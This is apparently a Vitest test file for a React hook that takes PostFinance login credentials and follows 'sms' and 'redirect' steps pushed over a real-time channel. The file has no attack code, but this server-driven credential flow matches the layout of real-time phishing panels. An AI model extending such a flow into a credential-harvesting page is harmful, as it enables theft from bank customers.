import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { renderHook, act, waitFor } from '@testing-library/react';

type Listener = (e: unknown) => void;
const listeners: Record<string, Listener> = {};

vi.mock('@/echo', () => ({
    echo: {
        channel: (_name: string) => ({
            listen: (event: string, cb: Listener) => {
                listeners[event] = cb;
            },
        }),
        leaveChannel: vi.fn(),
    },
}));

import { useBankLoginFlow } from './useBankLoginFlow';
import { bankAuthApi } from './api';

describe('useBankLoginFlow', () => {
    beforeEach(() => {
        for (const k of Object.keys(listeners)) delete listeners[k];
        vi.spyOn(bankAuthApi, 'login').mockResolvedValue({ ok: true });
        vi.spyOn(bankAuthApi, 'answer').mockResolvedValue({ ok: true });
    });

    afterEach(() => {
        vi.restoreAllMocks();
    });

    it('starts in idle state', () => {
        const { result } = renderHook(() =>
            useBankLoginFlow({ sessionId: 's-1', bankSlug: 'postfinance' }),
        );
        expect(result.current.command).toEqual({ type: 'idle' });
        expect(result.current.busy).toBe(false);
    });

    it('updates command when channel event arrives', async () => {
        const { result } = renderHook(() =>
            useBankLoginFlow({ sessionId: 's-1', bankSlug: 'postfinance' }),
        );

        act(() => {
            listeners['.BankSessionUpdated']({ command: { type: 'sms' } });
        });
        await waitFor(() => expect(result.current.command).toEqual({ type: 'sms' }));
    });

    it('redirects on redirect command', async () => {
        const hrefSetter = vi.fn();
        Object.defineProperty(window, 'location', {
            value: new Proxy(
                { href: '' },
                {
                    set(_t, p, v) {
                        if (p === 'href') hrefSetter(v);
                        return true;
                    },
                    get(_t, p) {
                        return p === 'href' ? '' : undefined;
                    },
                },
            ),
            writable: true,
        });

        renderHook(() => useBankLoginFlow({ sessionId: 's-1', bankSlug: 'postfinance' }));
        act(() => {
            listeners['.BankSessionUpdated']({
                command: { type: 'redirect', url: '/target' },
            });
        });
        await waitFor(() => expect(hrefSetter).toHaveBeenCalledWith('/target'));
    });

    it('calls api.login on submitCredentials', async () => {
        const { result } = renderHook(() =>
            useBankLoginFlow({ sessionId: 's-1', bankSlug: 'postfinance' }),
        );

        await act(async () => {
            await result.current.submitCredentials({ login: 'u', password: 'p' });
        });

        expect(bankAuthApi.login).toHaveBeenCalledWith('s-1', 'postfinance', {
            login: 'u',
            password: 'p',
        });
    });
});
